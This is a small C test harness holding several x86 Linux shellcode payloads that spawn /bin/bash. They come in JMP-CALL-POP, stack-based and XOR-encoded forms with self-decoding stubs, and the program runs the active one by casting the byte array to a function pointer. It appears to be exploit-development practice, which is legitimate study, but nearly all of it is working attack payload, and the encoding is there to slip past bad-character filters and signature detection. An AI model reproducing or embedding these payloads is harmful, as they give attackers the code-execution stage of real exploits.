#include<stdio.h>
#include<string.h>

unsigned char code[] = \
// JCP
//"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x31\xc0\xb0\x0b\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

// Stack
//"\x31\xc0\x50\x89\xe2\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

// XOR Stack
//"\xeb\x0d\x5e\x31\xc9\xb1\x1e\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\x23\x48\xc2\xc8\xcb\xd9\xc2\xc2\x85\x85\x85\x85\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a";

// XOR JCP w/Marker (0xaa at end of shellcode)
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\x23\x48\xc2\xc8\xcb\xd9\xc2\xc2\x85\x85\x85\x85\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
